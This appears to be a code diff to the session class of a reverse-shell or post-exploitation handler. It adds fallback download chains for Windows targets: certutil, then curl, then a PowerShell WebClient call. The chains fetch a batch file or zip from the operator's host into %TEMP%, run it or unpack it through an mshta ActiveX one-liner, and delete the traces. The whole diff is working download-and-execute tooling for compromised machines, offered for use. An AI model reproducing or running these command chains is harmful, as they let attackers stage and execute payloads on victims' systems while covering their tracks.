@@ -3618,10 +3618,13 @@ class Session:
 				stack.callback(lambda: server.stop())
 				server.init.wait(options.timeout_short)
 
+				_url = f'http://{self._host}:{server.port}{urlpath_bat}'
+				_dest = f'%TEMP%\\{temp_remote_file_bat}'
 				data = self.exec(
-					f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
-					f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
-					f'del "%TEMP%\\{temp_remote_file_bat}"',
+					f'(certutil -urlcache -split -f "{_url}" "{_dest}" >NUL 2>&1'
+					f' || curl -s -o "{_dest}" "{_url}" 2>NUL'
+					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\'{_url}\',\'{_dest}\')")'
+					f'&"{_dest}"&del "{_dest}"',
 					force_cmd=True,
 					value=True,
 					timeout=None
@@ -3932,7 +3935,14 @@ class Session:
 				tmp_escaped = self.tmp.replace('\\', '\\\\')
 				temp_remote_file_zip = urlpath_zip.split("/")[-1]
 
-				fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
+				_zip_url = f'http://{self._host}:{server.port}{urlpath_zip}'
+				_zip_dest = f'%TEMP%\\{temp_remote_file_zip}'
+				fetch_cmd = (
+					f'(certutil -urlcache -split -f "{_zip_url}" "{_zip_dest}" >NUL 2>&1'
+					f' || curl -s -o "{_zip_dest}" "{_zip_url}" 2>NUL'
+					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\'{_zip_url}\',\'{_zip_dest}\')")'
+					f' && echo DOWNLOAD OK'
+				)
 				unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{dst_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'
 
 				with open(tempfile_bat, "w") as f:
@@ -3941,8 +3951,13 @@ class Session:
 
 				urlpath_bat = server.add(tempfile_bat)
 				temp_remote_file_bat = urlpath_bat.split("/")[-1]
+				_bat_url = f'http://{self._host}:{server.port}{urlpath_bat}'
+				_bat_dest = f'%TEMP%\\{temp_remote_file_bat}'
 				response = self.exec(
-					f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
+					f'(certutil -urlcache -split -f "{_bat_url}" "{_bat_dest}" >NUL 2>&1'
+					f' || curl -s -o "{_bat_dest}" "{_bat_url}" 2>NUL'
+					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\'{_bat_url}\',\'{_bat_dest}\')")'
+					f'&"{_bat_dest}"&del "{_bat_dest}"',
 					force_cmd=True, value=True, timeout=None)
 
 				if not response:
